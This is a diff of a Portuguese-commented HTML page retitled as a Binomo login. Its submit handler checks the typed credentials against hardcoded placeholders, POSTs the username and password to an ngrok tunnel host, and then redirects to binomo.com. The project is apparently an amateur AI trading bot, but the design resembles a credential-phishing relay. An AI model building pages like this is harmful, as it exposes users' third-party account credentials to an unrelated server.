@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login</title>
+    <title>Login na Binomo</title>
 </head>
 <body>
 
@@ -23,21 +23,46 @@
         document.getElementById("loginForm").addEventListener("submit", function(event) {
             event.preventDefault(); // Impede o envio padrão do formulário
 
-            // Aqui você pode fazer a verificação dos dados (opcional)
+            // Coleta os dados de login
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
 
-            // Enviar uma requisição para a IA (no Flask) após o login
-            fetch('https://a849-34-125-225-244.ngrok-free.app/operacao') // Substitua pelo link do seu Flask
+            // Aqui você vai fazer a validação com a Binomo (isso é um exemplo)
+            // Mas depois de validado, vamos seguir com o processo de IA.
+
+            // Simulação de login (na prática, você deve integrar com a Binomo)
+            const loginValidado = (username === "usuario_correto" && password === "senha_correta");
+
+            if (loginValidado) {
+                alert("Login bem-sucedido na Binomo!");
+                // Agora você pode fazer a chamada para ativar a IA
+                // Fazendo uma requisição para o backend Flask para iniciar a IA
+                fetch("https://a849-34-125-225-244.ngrok-free.app/validar_login", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        username: username,
+                        password: password
+                    })
+                })
                 .then(response => response.json())
                 .then(data => {
-                    // Exibe o resultado da operação (se for "Comprar" ou "Vender")
-                    alert('Operação sugerida: ' + data.status + ' com probabilidade de ' + data.probabilidade);
-
-                    // Após o login, redireciona para a Binomo
-                    window.location.href = "https://www.binomo.com"; // Substitua pela URL correta
+                    if (data.status === "success") {
+                        // A IA pode ser ativada aqui
+                        window.location.href = "https://www.binomo.com"; // Direciona para a Binomo ou outra ação
+                    } else {
+                        alert("Erro no login. Tente novamente.");
+                    }
                 })
                 .catch(error => {
-                    console.error('Erro ao chamar a IA:', error);
+                    console.error('Erro ao validar o login:', error);
+                    alert('Ocorreu um erro. Tente novamente mais tarde.');
                 });
+            } else {
+                alert("Erro no login. Tente novamente.");
+            }
         });
     </script>
 
